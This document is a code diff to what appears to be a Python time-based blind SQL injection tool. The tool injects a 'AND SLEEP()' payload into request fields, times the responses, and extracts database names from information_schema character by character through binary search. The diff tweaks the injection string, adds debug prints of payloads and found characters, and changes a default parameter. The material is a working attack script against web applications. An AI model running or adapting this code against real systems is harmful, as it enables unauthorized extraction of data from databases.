@@ -65,6 +65,7 @@ def find_table_rows_count(url, method, headers, cookies, data, vuln_field,
         if log:
             file.write('{{{}: {}}}\n'.format(vuln_field, m_data[vuln_field]))
         elapsed = measure_request_time_no_threads(url, method, headers, cookies, m_data)
+        print(m_data)
         if elapsed >= sleep_time:
             found = True
         else:
@@ -154,7 +155,7 @@ def measure_request_time_no_threads(url, method, headers, cookies, data):
 
 def find_vuln_fields(url, method, headers, cookies, data, sleep_time):
     vuln_fields ={}
-    sql = '{} or 1=1 AND SLEEP({}) {}'
+    sql = '{} AND SLEEP({}) {}'
     m_data = data.copy()
     elapsed_time = -1
     for field in m_data:
@@ -252,9 +253,10 @@ def find_data_val_binary(url, method, headers, cookies, data, vuln_field,
             if log:
                 file.write('{{{}: {}}}\n'.format(vuln_field, m_data[vuln_field]))
             elapsed = measure_request_time_no_threads(url, method, headers, cookies, m_data)
-
+            print(m_data[vuln_field])
             if elapsed >= sleep_time:
                 data_val.append(chr(current))
+                print(chr(current))
                 found = True
                 if verbose:
                     print('\nFound character: %c\n\n' % chr(current))
@@ -265,6 +267,7 @@ def find_data_val_binary(url, method, headers, cookies, data, vuln_field,
                 if log:
                     file.write('{{{}: {}}}\n'.format(vuln_field, m_data[vuln_field]))
                 elapsed = measure_request_time_no_threads(url, method, headers, cookies, m_data)
+                print(m_data[vuln_field])
                 if elapsed >= sleep_time:
                     low = current
                 else:
@@ -359,7 +362,7 @@ def main(argv):
     sleep_time = args.sleep
     threads_num = args.threads
 
-    data = {'userid':'id'}
+    data = {'userid':'test'}
     print(url)
     print(data.items())
 
@@ -401,8 +404,7 @@ def main(argv):
     rows_count = find_table_rows_count(url, method, headers, cookies, data, sel_vuln_field, sel_vuln_type, INFORMATION_SCHEMA_DB_NAME, INF_SCHEMA_SCHEMATA, sleep_time)
     for i in range(rows_count):
         databases.append(find_data(url, method, headers, cookies, data, sel_vuln_field, sel_vuln_type, INFORMATION_SCHEMA_DB_NAME, INF_SCHEMA_SCHEMATA, INF_SCHEMA_SCHEMATA_SCHEMA_NAME, sleep_time, i))
-        print('Found: %s' % databases[i])
-    print
+        print('Found: %s' % databases[i]) 
     #######################
 
     choice = print_user_choice_table(databases, 'Databases found:')
